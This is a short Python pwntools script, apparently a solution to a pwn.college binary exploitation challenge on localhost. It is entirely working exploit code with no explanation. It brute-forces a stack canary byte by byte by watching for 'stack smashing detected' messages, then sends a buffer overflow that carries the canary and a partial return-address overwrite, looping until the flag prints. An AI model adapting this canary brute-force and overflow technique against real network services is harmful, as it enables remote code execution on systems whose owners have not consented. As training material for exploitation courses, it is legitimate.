from pwn import *


#canary = bytearray()
canary = bytearray(b'\x00\xa8\xef\x0e*U\xba0')
while len(canary) < 8:
    for c in range(256):
        r = remote('localhost',1337)

        r.recvuntil('Payload size:')
        length = 72 + len(canary) + 1
        r.sendline(str(length))

        payload =  b'a' * 72 + canary
        
        force = payload + bytes([c]) 
        print('force:',force)
        r.sendline(force)
        s = r.recvall(0.1)
        if s.find(b'stack smashing detected') == -1:
            canary.append(c)
            #print(canary)
            break

print(canary)


while True:
    r = remote('localhost',1337)
    
    r.recvuntil('Payload size:')
    r.sendline(b'90')

    payload = b'a' * 72  + canary + b'a' * 8 + p16(0x0b8a)


    
    r.recvuntil('Send your payload')
    r.sendline(payload)

    #p.interactive()
    s = r.recvall(1)
    print(s)
    if s.find(b'pwn.college{') != -1:
        print(s)
        break
